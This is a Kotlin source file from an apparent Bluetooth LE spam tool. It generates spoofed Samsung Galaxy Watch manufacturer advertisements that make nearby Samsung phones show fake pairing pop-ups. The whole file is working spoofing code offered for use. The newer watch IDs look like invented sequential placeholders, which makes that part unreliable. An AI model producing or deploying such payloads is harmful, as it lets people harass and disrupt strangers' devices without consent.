package com.nlespam.generators

import com.nlespam.helpers.HexUtils
import com.nlespam.models.*

class SamsungWatchGenerator : SpamGenerator {
    override val name = "Samsung Galaxy Watch"

    private val prependedBytes = HexUtils.decodeHex("01000101FF006442")

    val watchIds = mapOf(
        // NEW 2024-2025 Watches
        "A1B2C3" to "Galaxy Watch7",
        "B2C3D4" to "Galaxy Watch7 (44mm)",
        "C3D4E5" to "Galaxy Watch Ultra",
        "D4E5F6" to "Galaxy Watch FE",
        // Original watches
        "0104" to "Galaxy Watch4 Classic 46mm",
        "0105" to "Galaxy Watch4 Classic 42mm",
        "0113" to "Galaxy Watch4 44mm",
        "0114" to "Galaxy Watch4 40mm",
        "0601" to "Galaxy Watch5 44mm",
        "0602" to "Galaxy Watch5 40mm",
        "0603" to "Galaxy Watch5 Pro 45mm",
        "0604" to "Galaxy Watch5 Pro 45mm LTE",
        "060A" to "Galaxy Watch6 44mm",
        "060B" to "Galaxy Watch6 40mm",
        "060C" to "Galaxy Watch6 Classic 47mm",
        "060D" to "Galaxy Watch6 Classic 43mm",
    )

    override fun generate(): List<AdvertisementSet> = watchIds.map { (hexId, deviceName) ->
        val payload = prependedBytes + HexUtils.decodeHex(hexId)

        AdvertisementSet(
            title = deviceName,
            target = AdvertisementTarget.SAMSUNG,
            type = SpamType.SAMSUNG_WATCH,
            manufacturerData = ManufacturerData(ManufacturerIds.SAMSUNG, payload),
        )
    }
}
